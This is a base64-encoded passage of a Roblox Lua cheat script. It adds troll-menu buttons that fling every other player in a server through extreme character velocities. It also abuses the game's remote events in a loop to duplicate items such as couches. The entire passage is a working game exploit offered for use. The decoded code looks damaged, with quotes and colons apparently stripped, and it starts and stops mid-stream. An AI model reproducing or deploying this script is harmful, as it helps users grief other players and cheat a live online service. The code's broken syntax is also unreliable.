SArIDEgIC0tIFNldCBlbmQgdGltZSB0byAyIHNlY29uZHMgZnJvbSBub3cKICAgICAgICAgICAgICAgIHdoaWxlIHRpY2soKSAgZW5kVGltZSBkbyAgCiAgICAgICAgICAgICAgICAgICAgQW5nbGVzID0gQW5nbGVzICsgMTAwICAKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKSAgCiAgICAgIAogICAgICAgICAgICAgICAgICAgIC0tIE1vdmVtZW50cyBhbmQgYW5nbGVzIGZvciB0aGUgRmxpbmcKICAgICAgICAgICAgICAgICAgICBsb2NhbCBraWxsID0gZnVuY3Rpb24odGFyZ2V0LCBwb3MsIGFuZ2xlKSAgCiAgICAgICAgICAgICAgICAgICAgICAgIFBDYXJTZXRQcmltYXJ5UGFydENGcmFtZShDRnJhbWUubmV3KHRhcmdldC5Qb3NpdGlvbikgIHBvcyAgYW5nbGUpICAKICAgICAgICAgICAgICAgICAgICBlbmQgIAogICAgICAKICAgICAgICAgICAgICAgICAgICAtLSBGbGluZyB0byB2YXJpb3VzIHBvc2l0aW9ucyBhcm91bmQgdGhlIFRhcmdldFJQCiAgICAgICAgICAgICAgICAgICAga2lsbChUYXJnZXRSUCwgQ0ZyYW1lLm5ldygwLCAzLCAwKSwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZChBbmdsZXMpLCAwLCAwKSkgIAogICAgICAgICAgICAgICAgICAgIGtpbGwoVGFyZ2V0UlAsIENGcmFtZS5uZXcoMCwgLTEuNSwgMiksIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoQW5nbGVzKSwgMCwgMCkpICAKICAgICAgICAgICAgICAgICAgICBraWxsKFRhcmdldFJQLCBDRnJhbWUubmV3KDIsIDEuNSwgMi4yNSksIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoNTApLCAwLCAwKSkgIAogICAgICAgICAgICAgICAgICAgIGtpbGwoVGFyZ2V0UlAsIENGcmFtZS5uZXcoLTIuMjUsIC0xLjUsIDIuMjUpLCBDRnJhbWUuQW5nbGVzKG1hdGgucmFkKDMwKSwgMCwgMCkpICAKICAgICAgICAgICAgICAgICAgICBraWxsKFRhcmdldFJQLCBDRnJhbWUubmV3KDAsIDEuNSwgMCksIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoQW5nbGVzKSwgMCwgMCkpICAKICAgICAgICAgICAgICAgICAgICBraWxsKFRhcmdldFJQLCBDRnJhbWUubmV3KDAsIC0xLjUsIDApLCBDRnJhbWUuQW5nbGVzKG1hdGgucmFkKEFuZ2xlcyksIDAsIDApKSAgCiAgICAgICAgICAgICAgICBlbmQgIAogICAgICAgICAgICBlbmQgIAogICAgICAKICAgICAgICAgICAgLS0gSXRlcmF0ZSBvdmVyIGFsbCBwbGF5ZXJzCiAgICAgICAgICAgIGZvciBfLCBUYXJnZXQgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzR2V0UGxheWVycygpKSBkbyAgCiAgICAgICAgICAgICAgICAtLSBTa2lwIHRoZSBsb2NhbCBwbGF5ZXIKICAgICAgICAgICAgICAgIGlmIFRhcmdldCB+PSBQbGF5ZXIgdGhlbiAgCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgVGFyZ2V0QyA9IFRhcmdldC5DaGFyYWN0ZXIgIAogICAgICAgICAgICAgICAgICAgIGxvY2FsIFRhcmdldEggPSBUYXJnZXRDIGFuZCBUYXJnZXRDRmluZEZpcnN0Q2hpbGRPZkNsYXNzKEh1bWFub2lkKSAgCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgVGFyZ2V0UlAgPSBUYXJnZXRDIGFuZCBUYXJnZXRDRmluZEZpcnN0Q2hpbGQoSHVtYW5vaWRSb290UGFydCkgIAogICAgICAKICAgICAgICAgICAgICAgICAgICAtLSBJZiB0aGUgdGFyZ2V0IGFuZCBpdHMgY29tcG9uZW50cyBhcmUgZm91bmQsIGV4ZWN1dGUgdGhlIGZsaW5nCiAgICAgICAgICAgICAgICAgICAgaWYgVGFyZ2V0QyBhbmQgVGFyZ2V0SCBhbmQgVGFyZ2V0UlAgdGhlbiAgCiAgICAgICAgICAgICAgICAgICAgICAgIGZsaW5nUGxheWVyKFRhcmdldEMsIFRhcmdldFJQLCBUYXJnZXRIKSAgLS0gRmxpbmcgdGhlIGN1cnJlbnQgcGxheWVyCiAgICAgICAgICAgICAgICAgICAgZW5kICAKICAgICAgICAgICAgICAgIGVuZCAgCiAgICAgICAgICAgIGVuZCAgCiAgICAgIAogICAgICAgICAgICAtLSBSZXR1cm4gdGhlIHBsYXllciB0byB0aGVpciBvcmlnaW5hbCBwb3NpdGlvbgogICAgICAgICAgICB0YXNrLndhaXQoMC41KSAgCiAgICAgICAgICAgIFBDYXJTZXRQcmltYXJ5UGFydENGcmFtZShDRnJhbWUubmV3KDAsIDAsIDApKSAgCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpICAKICAgICAgICAgICAgSHVtYW5vaWQuU2l0ID0gZmFsc2UgIAogICAgICAgICAgICB0YXNrLndhaXQoMC41KSAgCiAgICAgICAgICAgIFJvb3RQYXJ0LkNGcmFtZSA9IE9sZFBvcyAgCiAgICAgIAogICAgICAgICAgICAtLSBSZW1vdmUgdGhlIEJvZHlHeXJvIGFmdGVyIHRoZSBlZmZlY3QKICAgICAgICAgICAgU3Bpbkd5cm9EZXN0cm95KCkgIAogICAgZW5kCn0pCnByaW50KEZsaW5nIEJvYXQgQWxsIGJ1dHRvbiBjcmVhdGVkKQoKVHJvbGxBZGRCdXR0b24oewogICAgTmFtZSA9IEF1dG8gRmxpbmcgQWxsLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICBsb2NhbCBQbGF5ZXJzID0gZ2FtZUdldFNlcnZpY2UoUGxheWVycykKICAgIGxvY2FsIFJlcGxpY2F0ZWRTdG9yYWdlID0gZ2FtZUdldFNlcnZpY2UoUmVwbGljYXRlZFN0b3JhZ2UpCiAgICBsb2NhbCBMb2NhbFBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKICAgIGxvY2FsIGNhbSA9IHdvcmtzcGFjZS5DdXJyZW50Q2FtZXJhCgoKICAgIGxvY2FsIGZ1bmN0aW9uIFByb2Nlc3NQbGF5ZXIodGFyZ2V0KQogICAgICAgIGlmIG5vdCB0YXJnZXQgb3Igbm90IHRhcmdldC5DaGFyYWN0ZXIgb3IgdGFyZ2V0ID09IExvY2FsUGxheWVyIHRoZW4gcmV0dXJuIGVuZAogICAgICAgIAogICAgICAgIGxvY2FsIGZsaW5nQWN0aXZlID0gdHJ1ZQogICAgICAgIGxvY2FsIHJvb3QgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIExvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKEh1bWFub2lkUm9vdFBhcnQpCiAgICAgICAgbG9jYWwgdFJvb3QgPSB0YXJnZXQuQ2hhcmFjdGVyIGFuZCB0YXJnZXQuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQoSHVtYW5vaWRSb290UGFydCkKICAgICAgICBpZiBub3Qgcm9vdCBvciBub3QgdFJvb3QgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgCiAgICAgICAgbG9jYWwgY2hhciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgIGxvY2FsIGh1bSA9IGNoYXJGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoSHVtYW5vaWQpCiAgICAgICAgbG9jYWwgb3JpZ2luYWwgPSByb290LkNGcmFtZQoKICAgIAogICAgICAgIFJlcGxpY2F0ZWRTdG9yYWdlV2FpdEZvckNoaWxkKFJFKVdhaXRGb3JDaGlsZCgxQ2xlYTFyVG9vbDFzKUZpcmVTZXJ2ZXIoQ2xlYXJBbGxUb29scykKICAgICAgICB0YXNrLndhaXQoMC4yKQoKICAKICAgICAgICBSZXBsaWNhdGVkU3RvcmFnZS5SRUZpbmRGaXJzdENoaWxkKDFUb28xbClJbnZva2VTZXJ2ZXIoUGlja2luZ1Rvb2xzLCBDb3VjaCkKICAgICAgICB0YXNrLndhaXQoMC4zKQoKICAgICAgICBsb2NhbCB0b29sID0gTG9jYWxQbGF5ZXIuQmFja3BhY2tGaW5kRmlyc3RDaGlsZChDb3VjaCkKICAgICAgICBpZiB0b29sIHRoZW4KICAgICAgICAgICAgdG9vbC5QYXJlbnQgPSBjaGFyCiAgICAgICAgZW5kCnRhc2sud2FpdCgwLjEpCgpnYW1lR2V0U2VydmljZShWaXJ0dWFsSW5wdXRNYW5hZ2VyKVNlbmRLZXlFdmVudCh0cnVlLCBFbnVtLktleUNvZGUuRiwgZmFsc2UsIGdhbWUpCnRhc2sud2FpdCgwLjI1KQoKICAgICAgICB3b3Jrc3BhY2UuRmFsbGVuUGFydHNEZXN0cm95SGVpZ2h0ID0gMDAKCiAgICAgICAgbG9jYWwgYnYgPSBJbnN0YW5jZS5uZXcoQm9keVZlbG9jaXR5KQogICAgICAgIGJ2Lk5hbWUgPSBGbGluZ0ZvcmNlCiAgICAgICAgYnYuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldyg5ZTgsIDllOCwgOWU4KQogICAgICAgIGJ2Lk1heEZvcmNlID0gVmVjdG9yMy5uZXcobWF0aC5odWdlLCBtYXRoLmh1Z2UsIG1hdGguaHVnZSkKICAgICAgICBidi5QYXJlbnQgPSByb290CgogICAgICAgIGh1bVNldFN0YXRlRW5hYmxlZChFbnVtLkh1bWFub2lkU3RhdGVUeXBlLlNlYXRlZCwgZmFsc2UpCiAgICAgICAgaHVtLlBsYXRmb3JtU3RhbmQgPSBmYWxzZQogICAgICAgIGNhbS5DYW1lcmFTdWJqZWN0ID0gdGFyZ2V0LkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKEhlYWQpIG9yIHRSb290IG9yIGh1bQoKIAogICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICBsb2NhbCBhbmdsZSA9IDAKICAgICAgICAgICAgbG9jYWwgcGFydHMgPSB7cm9vdH0KICAgICAgICAgICAgd2hpbGUgZmxpbmdBY3RpdmUgYW5kIHRhcmdldCBhbmQgdGFyZ2V0LkNoYXJhY3RlciBhbmQgdGFyZ2V0LkNoYXJhY3RlckZpbmRGaXJzdENoaWxkT2ZDbGFzcyhIdW1hbm9pZCkgZG8KICAgICAgICAgICAgICAgIGxvY2FsIHRIdW0gPSB0YXJnZXQuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGRPZkNsYXNzKEh1bWFub2lkKQogICAgICAgICAgICAgICAgaWYgdEh1bS5TaXQgdGhlbiBicmVhayBlbmQKICAgICAgICAgICAgICAgIGFuZ2xlICs9IDUwCgogICAgICAgICAgICAgICAgZm9yIF8sIHBhcnQgaW4gaXBhaXJzKHBhcnRzKSBkbwogICAgICAgICAgICAgICAgICAgIGxvY2FsIGhycCA9IHRhcmdldC5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydAogICAgICAgICAgICAgICAgICAgIGxvY2FsIHBvcyA9IGhycC5Qb3NpdGlvbiArIGhycC5WZWxvY2l0eSAgMS41CiAgICAgICAgICAgICAgICAgICAgcm9vdC5DRnJhbWUgPSBDRnJhbWUubmV3KHBvcykgIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoYW5nbGUpLCAwLCAwKQogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgcm9vdC5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDllOCwgOWU4LCA5ZTgpCiAgICAgICAgICAgICAgICByb290LlJvdFZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoOWU4LCA5ZTgsIDllOCkKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgCiAgICAgICAgICAgIGZsaW5nQWN0aXZlID0gZmFsc2UKICAgICAgICAgICAgYnZEZXN0cm95KCkKICAgICAgICAgICAgaHVtU2V0U3RhdGVFbmFibGVkKEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuU2VhdGVkLCB0cnVlKQogICAgICAgICAgICBodW0uUGxhdGZvcm1TdGFuZCA9IGZhbHNlCiAgICAgICAgICAgIHJvb3QuQ0ZyYW1lID0gb3JpZ2luYWwKICAgICAgICAgICAgY2FtLkNhbWVyYVN1YmplY3QgPSBodW0KCiAgICAgICAgICAgIGZvciBfLCBwIGluIHBhaXJzKGNoYXJHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgaWYgcElzQShCYXNlUGFydCkgdGhlbgogICAgICAgICAgICAgICAgICAgIHAuVmVsb2NpdHkgPSBWZWN0b3IzLnplcm8KICAgICAgICAgICAgICAgICAgICBwLlJvdFZlbG9jaXR5ID0gVmVjdG9yMy56ZXJvCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBodW1VbmVxdWlwVG9vbHMoKQogICAgICAgICAgICBSZXBsaWNhdGVkU3RvcmFnZS5SRUZpbmRGaXJzdENoaWxkKDFUb28xbClJbnZva2VTZXJ2ZXIoUGlja2luZ1Rvb2xzLCBDb3VjaCkKICAgICAgICBlbmQpCiAgICAgICAKICAgICAgICB3aGlsZSBmbGluZ0FjdGl2ZSBkbwogICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgIGVuZAogICAgZW5kCgoKICAgIGZvciBfLCBwbGF5ZXIgaW4gaXBhaXJzKFBsYXllcnNHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgUHJvY2Vzc1BsYXllcihwbGF5ZXIpCgkJCWVuZAogICAgZW5kCn0pCgpUcm9sbEFkZEJ1dHRvbih7CiAgICBOYW1lID0gQnJpbmcgQWxsIENvdWNoIFtCZXN0XSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIGFyZ3MgPSB7CiAgICBbMV0gPSBDbGVhckFsbFRvb2xzCn0KCmdhbWVHZXRTZXJ2aWNlKFJlcGxpY2F0ZWRTdG9yYWdlKVdhaXRGb3JDaGlsZChSRSlXYWl0Rm9yQ2hpbGQoMUNsZWExclRvb2wxcylGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKCndhaXQoMC4yKQoKdG9vbHNlbGN0ZWQgPSBDb3VjaApkdXBlYW1vdCA9IDI1IC0tUHV0IGFtb3VudCB0byBkdXBlCnBpY2t0b29scmVtb3RlID0gZ2FtZUdldFNlcnZpY2UoUmVwbGljYXRlZFN0b3JhZ2UpLlJFRmluZEZpcnN0Q2hpbGQoMVRvbzFsKQpjbGVhcnRvb2xyZW1vdGUgPSBnYW1lR2V0U2VydmljZShSZXBsaWNhdGVkU3RvcmFnZSkuUkVGaW5kRmlyc3RDaGlsZCgxQ2xlYTFyVG9vbDFzKQpnYW1lR2V0U2VydmljZShTdGFydGVyR3VpKVNldENvcmUoU2VuZE5vdGlmaWNhdGlvbix7VGl0bGU9RHVwaW5nLFRleHQ9RG8gbm90IGNsaWNrIGFueXRoaW5nIHdoaWxlIGR1cGluZy4gLCBCdXR0b24xID0gSSB1bmRlcnN0YW5kICxEdXJhdGlvbj01fSkKZ2FtZUdldFNlcnZpY2UoU3RhcnRlckd1aSlTZXRDb3JlKFNlbmROb3RpZmljYXRpb24se1RpdGxlPUR1cGUgU2NyaXB0LFRleHQ9QmVjYXVzZSBJdCB3aWxsIGJyZWFrIHRoZSBzY3JpcHQgYW5kIHlvdSB3aWxsIG5lZWQgdG8gcmVqb2luLiwgQnV0dG9uMSA9IEkgdW5kZXJzdGFuZCAsRHVyYXRpb249NX0pIApkdXBpbmcgPSB0cnVlCm9sZGNmID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZQppZiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLlNpdCA9PSB0cnVlIHRoZW4KICAgIHRhc2sud2FpdCgpCiAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLlNpdCA9IGZhbHNlCmVuZAp3YWl0KDAuMSkKaWYgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSkgdGhlbgogICAgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSlEZXN0cm95KCkgCmVuZApmb3IgbT0xLDIgZG8gCiAgICB0YXNrLndhaXQoKQogICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoOTk5OTk5OTk5LjQxNCwgLTQ5MCwgOTk5OTk5OTk5LjQxNCwgMC45NzQzNjA0MDYsIC0wLjE3NTczNDA4OCwgMC4xNDA0OTc2MSwgLTAuMTMzNDQxNDA0LCAwLjA1MTQwNTMwNjksIDAuOTg5NzIyNzI5LCAtMC4xODExNTAzMDIsIC0wLjk4MzA5NDY5MiwgMC4wMjY2MzcwOTIyKQplbmQKdGFzay53YWl0KDAuMikKZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gdHJ1ZQp3YWl0KDAuNSkKZm9yIGFpZGosYWZoIGluIHBhaXJzKGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkNoYXJhY3RlckdldENoaWxkcmVuKCkpIGRvCiAgICBpZiBhZmguTmFtZSA9PSB0b29sc2VsY3RlZCA9PSBmYWxzZSB0aGVuCiAgICAgICAgaWYgYWZoSXNBKFRvb2wpIHRoZW4KICAgICAgICAgICAgYWZoLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgIGVuZAogICAgZW5kCmVuZApmb3IgYWllZmhpZXdod2YsZHZqYnZqIGluIHBhaXJzKGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkJhY2twYWNrR2V0Q2hpbGRyZW4oKSkgZG8KICAgIGlmIGR2amJ2aklzQShUb29sKSB0aGVuCiAgICAgICAgaWYgZHZqYnZqLk5hbWUgPT0gdG9vbHNlbGN0ZWQgPT0gZmFsc2UgdGhlbgogICAgICAgICAgICBkdmpidmpEZXN0cm95KCkKICAgICAgICBlbmQKICAgIGVuZAplbmQKZm9yIHR0anRqdXRqdXRqanRqLGRkdmR2ZHN2ZGZicm55dHl0bXZkdiBpbiBwYWlycyhnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXJHZXRDaGlsZHJlbigpKSBkbwogICAgaWYgZGR2ZHZkc3ZkZmJybnl0eXRtdmR2SXNBKFRvb2wpIHRoZW4KICAgICAgICBpZiBkZHZkdmRzdmRmYnJueXR5dG12ZHYubmFtZSA9PSB0b29sc2VsY3RlZCA9PSBmYWxzZSB0aGVuCiAgICAgICAgICAgIGRkdmR2ZHN2ZGZicm55dHl0bXZkdkRlc3Ryb3koKQogICAgICAgIGVuZAogICAgZW5kCmVuZApmb3IgZmluZGluLHRvb2xsZWwgaW4gcGFpcnMoZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyR2V0Q2hpbGRyZW4oKSkgZG8KICAgIGlmIHRvb2xsZWxJc0EoVG9vbCkgdGhlbgogICAgICAgIGlmIHRvb2xsZWwuTmFtZSA9PSB0b29sc2VsY3RlZCB0aGVuCiAgICAgICAgICAgIHRvb2xsbGxmb3VuMiA9IHRydWUKICAgICAgICAgICAgZm9yIGJhc2MsYWlqZncgaW4gcGFpcnModG9vbGxlbEdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICBpZiBhaWpmdy5OYW1lID09IEhhbmRsZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgYWlqZncuTmFtZSA9IEjiIKVh4iClbuIgpWTiIKVs4iClZQogICAgICAgICAgICAgICAgICAgIHRvb2xsZWwuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgICAgICAgICAgICAgdG9vbGxlbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgdG9sbGxsYWhoaGggPSB0b29sbGVsCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbHNlIAogICAgICAgICAgICB0b29sbGxsZm91bjIgPSBmYWxzZQogICAgICAgIGVuZAogICAgZW5kCmVuZApmb3IgZmlpZmksdG9vbGxsbCBpbiBwYWlycyhnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5CYWNrcGFja0dldENoaWxkcmVuKCkpIGRvCiAgICBpZiB0b29sbGxsSXNBKFRvb2wpIHRoZW4KICAgICAgICBpZiB0b29sbGxsLk5hbWUgPT0gdG9vbHNlbGN0ZWQgdGhlbgogICAgICAgICAgICB0b29sbGxsZm91biA9IHRydWUKICAgICAgICAgICAgZm9yIG5hbmEsampzanNqIGluIHBhaXJzKHRvb2xsbGxHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgaWYgampzanNqLk5hbWUgPT0gSGFuZGxlIHRoZW4KICAgICAgICAgICAgICAgICAgICB0b29sbGxsLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICB3YWl0KCkKICAgICAgICAgICAgICAgICAgICBqanNqc2ouTmFtZSA9IEjiIKVh4iClbuIgpWTiIKVs4iClZQogICAgICAgICAgICAgICAgICAgIHRvb2xsbGwuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgICAgICAgICAgICAgdG9vbGxsbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgdG9vbGxsZmZlbCA9IHRvb2xsbGwKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbHNlIAogICAgICAgICAgICB0b29sbGxsZm91biA9IGZhbHNlCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCmlmIHRvb2xsbGxmb3VuID09IHRydWUgdGhlbgogICAgaWYgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKHRvb2xsbGZmZWwpID09IG5pbCB0aGVuICAKICAgICAgICB0b29sbGxsZm91biA9IGZhbHNlIAogICAgZW5kCiAgICByZXBlYXQgd2FpdCgpIHVudGlsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZCh0b29sbGxmZmVsKSA9PSBuaWwKICAgIHRvb2xsbGxmb3VuID0gZmFsc2UKZW5kCmlmIHRvb2xsbGxmb3VuMiA9PSB0cnVlIHRoZW4KICAgIGlmIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZCh0b2xsbGxhaGhoaCkgPT0gbmlsIHRoZW4gCiAgICAgICAgdG9vbGxsbGZvdW4yID0gZmFsc2UgCiAgICBlbmQKICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKHRvbGxsbGFoaGhoKSA9PSBuaWwKICAgIHRvb2xsbGxmb3VuMiA9IGZhbHNlCmVuZAp3YWl0KDAuMSkKZm9yIG09MSwgZHVwZWFtb3QgZG8KICAgIGlmIGR1cGluZyA9PSBmYWxzZSB0aGVuIAogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlIAogICAgICAgIHJldHVybiAKICAgIGVuZAogICAgaWYgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSkgdGhlbgogICAgICAgIGdhbWVHZXRTZXJ2aWNlKFdvcmtzcGFjZSlGaW5kRmlyc3RDaGlsZChDYW1lcmEpRGVzdHJveSgpIAogICAgZW5kCiAgICBpZiBtID0gZHVwZWFtb3QgdGhlbgogICAgICAgIGdhbWVHZXRTZXJ2aWNlKFN0YXJ0ZXJHdWkpU2V0Q29yZShTZW5kTm90aWZpY2F0aW9uLHtUaXRsZT1EdXBpbmcsVGV4dD1Zb3UgaGF2ZS4uIC4ubS4uIC4uRHVwZWQuLiAuLnRvb2xzZWxjdGVkLi4hLER1cmF0aW9uPTAuNX0pCiAgICBlbHNlaWYgbSA9PSBkdXBlYW1vdCBvciBtID0gZHVwZWFtb3QgLSAxIHRoZW4KICAgICAgICBnYW1lR2V0U2VydmljZShTdGFydGVyR3VpKVNldENvcmUoU2VuZE5vdGlmaWNhdGlvbix7VGl0bGU9RHVwaW5nLFRleHQ9WW91IGhhdmUuLiAuLm0uLiAuLkR1cGVkLi4gLi50b29sc2VsY3RlZC4uIS4uIC4uRHVwaW5nIHRvb2xzIGlzIGRvbmUgbm93LCBQbGVhc2Ugd2FpdCBhIGxpdHRsZSBiaXQgdG8gcmVzcGF3bi4sRHVyYXRpb249NH0pCiAgICBlbmQKICAgIGxvY2FsIGFyZ3MgPSB7CiAgICAgICAgWzFdID0gUGlja2luZ1Rvb2xzLAogICAgICAgIFsyXSA9IHRvb2xzZWxjdGVkCiAgICB9CiAgICAKICAgIHBpY2t0b29scmVtb3RlSW52b2tlU2VydmVyKHVucGFjayhhcmdzKSkKICAgIGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkJhY2twYWNrV2FpdEZvckNoaWxkKHRvb2xzZWxjdGVkKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICBpZiBkdXBpbmcgPT0gZmFsc2UgdGhlbiAKICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSBmYWxzZSAKICAgICAgICByZXR1cm4gCiAgICBlbmQKICAgIHdhaXQoKQogICAgZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyW3Rvb2xzZWxjdGVkXUZpbmRGaXJzdENoaWxkKEhhbmRsZSkuTmFtZSA9IEjiIKVh4iClbuIgpWTiIKVs4iClZQogICAgZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQodG9vbHNlbGN0ZWQpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQmFja3BhY2tGaW5kRmlyc3RDaGlsZCh0b29sc2VsY3RlZCkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgcmVwZWF0ICAKICAgICAgICBpZiBnYW1lR2V0U2VydmljZShXb3Jrc3BhY2UpRmluZEZpcnN0Q2hpbGQoQ2FtZXJhKSB0aGVuCiAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFdvcmtzcGFjZSlGaW5kRmlyc3RDaGlsZChDYW1lcmEpRGVzdHJveSgpIAogICAgICAgIGVuZAogICAgICAgIHRhc2sud2FpdCgpIAogICAgdW50aWwgZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQodG9vbHNlbGN0ZWQpID09IG5pbAplbmQKZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UKcmVwZWF0IHdhaXQoKSB1bnRpbCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQoSHVtYW5vaWRSb290UGFydCkgPT0gbmlsCnJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKEh1bWFub2lkUm9vdFBhcnQpCmdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBvbGRjZgp3YWl0KCkKZHVwaW5nID0gZmFsc2UKCmZvciB3d2VmZWYsd2VpZnd3ZSBpbiBwYWlycyhnYW1lLlBsYXllcnNHZXRQbGF5ZXJzKCkpIGRvCiAgICBpZiB3ZWlmd3dlLk5hbWUgPT0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLk5hbWUgPT0gZmFsc2UgdGhlbgogICAgICAgIGV3b2lmandvaWZqaXdvID0gd3dlZmVmCiAgICBlbmQKZW5kCmZv